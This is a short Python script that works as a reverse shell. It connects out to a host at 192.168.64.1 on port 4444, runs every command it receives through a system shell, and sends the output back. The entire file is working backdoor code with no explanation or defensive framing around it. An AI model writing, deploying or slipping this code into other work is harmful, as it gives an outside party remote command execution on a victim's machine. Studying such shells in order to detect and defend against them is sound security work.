import socket 
import subprocess
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.64.1"
port = 4444
client.connect((host, port))
while True:
    command = client.recv(1024).decode()
    sub = subprocess.Popen(command, shell = True ,stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    error_out = sub.stderr.read()
    main_out = sub.stdout.read()
    client.send(error_out + main_out)
